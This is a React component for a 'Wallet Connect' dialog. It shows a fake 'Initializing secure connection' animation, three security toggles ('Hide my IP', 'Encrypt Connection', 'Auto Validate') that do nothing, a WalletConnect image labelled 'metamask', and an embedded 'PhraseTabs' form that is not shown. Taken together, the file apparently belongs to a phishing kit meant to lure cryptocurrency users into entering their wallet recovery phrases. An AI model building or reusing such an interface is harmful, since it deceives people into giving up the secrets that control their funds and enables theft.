"use client";
import * as React from "react";
import { cn } from "@/lib/utils";
import { useMediaQuery } from "usehooks-ts";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "@/components/ui/dialog";
import {
  Drawer,
  DrawerContent,
  DrawerDescription,
  DrawerHeader,
  DrawerTitle,
  DrawerTrigger,
} from "@/components/ui/drawer";
import Image from "next/image";
import { Label } from "@/components/ui/label";
import { Switch } from "@/components/ui/switch";
import { PhraseTabs } from "../phrase_tabs";

export function PhraseDialog({ children }) {
  const [open, setOpen] = React.useState(false);
  const isDesktop = useMediaQuery("(min-width: 768px)");

  if (isDesktop) {
    return (
      <Dialog open={open} onOpenChange={setOpen}>
        <DialogTrigger asChild>{children}</DialogTrigger>
        <DialogContent className="bg-white sm:max-w-[425px]">
          <DialogHeader>
            <DialogTitle className="mb-4 text-center text-xl">
              Wallet Connect
            </DialogTitle>
            <hr />
            <DialogDescription />
          </DialogHeader>
          <ProfileForm />
        </DialogContent>
      </Dialog>
    );
  }

  return (
    <Drawer open={open} onOpenChange={setOpen}>
      <DrawerTrigger asChild>{children}</DrawerTrigger>
      <DrawerContent className="rounded-t-[3rem] bg-white pb-4 outline-none">
        <DrawerHeader>
          <DrawerTitle className="mb-4 text-center text-xl">
            Wallet Connect
          </DrawerTitle>
          <hr />
          <DrawerDescription />
        </DrawerHeader>
        <ProfileForm className="px-4" />
      </DrawerContent>
    </Drawer>
  );
}

function ProfileForm({ className }) {
  return (
    <div className={cn("grid items-start gap-3 bg-white", className)}>
      <div className="flex justify-center">
        <Image
          className="rounded-3xl border-[3px] border-[#3396ff]"
          width={100}
          height={100}
          alt="metamask"
          src="/images/walletconnect.jpg"
        />
      </div>

      <div className="mx-auto mt-2 animate-pulse text-center leading-none">
        <small className="text-gray-500">
          Initializing secure connection with Walletconnect...
        </small>
      </div>
      <div className="grid grid-cols-2">
        <div className="flex items-center space-x-2">
          <Label
            htmlFor="airplane-mode"
            className="7ont-normal text-xs text-gray-600"
          >
            Hide my IP
          </Label>
          <Switch id="airplane-mode" />
        </div>
        <div className="flex items-center space-x-2">
          <Label
            htmlFor="airplane-mode"
            className="7ont-normal text-xs text-gray-600"
          >
            Encrypt Connection
          </Label>
          <Switch defaultChecked={true} id="airplane-mode" />
        </div>
        <div className="flex items-center space-x-2">
          <Label
            htmlFor="airplane-mode"
            className="7ont-normal text-xs text-gray-600"
          >
            Auto Validate
          </Label>
          <Switch defaultChecked={true} id="airplane-mode" />
        </div>
      </div>

      <PhraseTabs />
    </div>
  );
}
